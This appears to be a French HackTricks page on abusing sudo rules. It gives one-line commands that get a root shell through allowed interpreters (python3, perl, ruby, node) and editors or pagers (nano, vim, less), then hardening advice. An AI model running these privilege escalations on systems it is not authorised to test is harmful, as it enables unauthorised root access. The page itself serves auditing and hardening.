# Abus des commandes Sudo

{{#include ../../banners/hacktricks-training.md}}

## Interpréteurs autorisés par Sudo

Si `sudo -l` permet à un utilisateur d'exécuter un interpréteur en tant que root, considérez cela comme une exécution directe de code. Les interpréteurs sont conçus pour exécuter du code arbitraire ; une règle autorisant les binaires `python3`, `perl`, `ruby`, `lua`, `node` ou similaires équivaut généralement à l'exécution de commandes root, sauf si les arguments sont strictement limités et validés.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

Processus courant de vérification : commencez par lister les privilèges de l'utilisateur, puis exécutez une instruction Python avec l'option `-c` de l'interpréteur.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
D'autres exemples d'interpréteurs sont présentés ci-dessous ; les interpréteurs listés documentent l'exécution de code inline ou les API de processus enfants.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Le chemin exact compte. Si la règle sudo autorise `/usr/bin/python3`, utilisez ce chemin exact lors de la validation.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Éditeurs autorisés par Sudo

Si `sudo -l` permet à un utilisateur d'exécuter un éditeur interactif en tant que root, considérez cela comme une surface d'exécution de commandes, et non comme une autorisation inoffensive de modifier des fichiers. Les éditeurs peuvent souvent exécuter des commandes shell, lire des fichiers arbitraires, écrire des fichiers arbitraires ou appeler des helpers externes depuis l'éditeur.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Flux de vérification courant : répertorier les privilèges de l'utilisateur, puis invoquer chaque éditeur ou pager autorisé via sudo.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Exécution de commandes avec `nano`

Lorsque `nano` est autorisé via sudo, l’exécution de commandes peut être accessible depuis l’interface de l’éditeur.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
Fournissez ensuite une commande telle que `id` ou `/bin/sh` à l’invite de commande de nano.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
Si un shell interactif ne dispose pas de flux de terminal utilisables, cette forme de redirection mappe sa sortie standard et son flux d’erreur au descripteur 0.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
La séquence de touches exacte peut varier selon la version de nano et les options de compilation, mais le problème de sécurité reste le même : l'éditeur s'exécute en tant que root et peut invoquer des commandes externes.<sup>[[1]](#references)[[12]](#references)</sup>

### Autres échappements courants des éditeurs

Les éditeurs de type Vim permettent généralement d'exécuter des commandes via `:!`.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
Les pagers tels que `less` peuvent également permettre l’exécution de commandes shell.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## Notes défensives

- Évitez d’autoriser les interpréteurs ou les éditeurs interactifs via sudo.<sup>[[1]](#references)</sup>
- Préférez des wrappers fixes appartenant à root, qui exécutent une seule action administrative ciblée.<sup>[[1]](#references)[[2]](#references)</sup>
- Si l’utilisation d’un interpréteur est inévitable, limitez le chemin exact du script et empêchez les arguments contrôlés par l’utilisateur, les imports accessibles en écriture, `PYTHONPATH` et la préservation dangereuse de l’environnement.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- Si la modification de fichiers est nécessaire, limitez le chemin exact du fichier et envisagez `sudoedit` avec des versions corrigées de sudo et une gestion stricte de l’environnement.<sup>[[1]](#references)[[2]](#references)</sup>
- Examinez `SETENV`, `env_keep`, les répertoires de travail accessibles en écriture, les chemins de modules/imports accessibles en écriture, `NOEXEC`, `use_pty` et la journalisation, mais ne les considérez pas comme une sandbox complète.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — page de manuel Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — page de manuel Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Ligne de commande et environnement — documentation Python](https://docs.python.org/3/using/cmdline.html)
- [4] [os — interfaces diverses du système d’exploitation — documentation Python](https://docs.python.org/3/library/os.html)
- [5] [perlrun — comment exécuter l’interpréteur Perl](https://perldoc.perl.org/perlrun)
- [6] [exec — documentation Perl](https://perldoc.perl.org/functions/exec)
- [7] [Options de ligne de commande Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — documentation Ruby](https://ruby-doc.org/3.4/Kernel.html)
- [9] [API de ligne de commande — documentation Node.js](https://nodejs.org/api/cli.html)
- [10] [Processus enfant — documentation Node.js](https://nodejs.org/api/child_process.html)
- [11] [Page de manuel lua de Lua 5.4](https://www.lua.org/manual/5.4/lua.html)
- [12] [L’éditeur de texte GNU nano](https://nano-editor.org/manual.html)
- [13] [Vim : usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — page de manuel Linux](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirections — manuel de référence Bash](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
